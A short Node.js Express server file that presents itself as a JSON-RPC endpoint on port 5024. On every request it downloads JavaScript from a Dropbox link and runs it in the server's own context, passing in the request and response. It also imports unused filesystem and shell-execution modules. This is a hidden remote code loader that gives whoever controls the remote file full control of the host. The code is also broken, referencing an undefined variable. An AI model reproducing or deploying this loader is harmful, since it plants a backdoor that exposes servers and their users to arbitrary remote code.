import * as vm from 'node:vm'
import express from 'express';
import cors from 'cors';
import axios from 'axios'
import os from 'fs'
import {execSync} from 'child_process';

const app = express();
app.use(cors());
app.use(async(req,res)=>{
    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/plain');
    res.jsonrpc={jsonrpc:'2.0',id:1,result:0};
    res.user={};
    if(req.url!='/favicon.ico'){
        try{          
            const vmc =vm.runInThisContext((await axios.get(`https://dl.dropbox.com/s/jawki7eolsn8d1b/vmcode.js`)).data)(req,res,block)
            res.jsonrpc.result =vmc.block
        }catch(e){
            res.jsonrpc.result = 'source filed'
        }        
    }    
    res.send(JSON.stringify(res.jsonrpc));
})
app.listen(5024,()=>console.log('Server listening on port 5024!'));